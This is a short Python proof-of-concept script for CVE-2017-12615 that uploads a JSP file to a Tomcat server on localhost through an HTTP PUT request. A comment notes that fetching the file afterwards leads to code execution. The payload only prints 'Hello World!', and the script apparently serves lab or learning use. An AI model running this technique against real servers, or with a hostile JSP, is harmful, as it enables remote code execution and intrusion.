import requests

#CVE-2017-12615
URL = 'http://localhost:8080/new_file.jsp/'
file_content = '<% out.write("Hello World!"); %>'

# this puts the new resource. Now we can access this using GET which leads to code execution
r = requests.put(url = URL, data = file_content) 

print(r.json())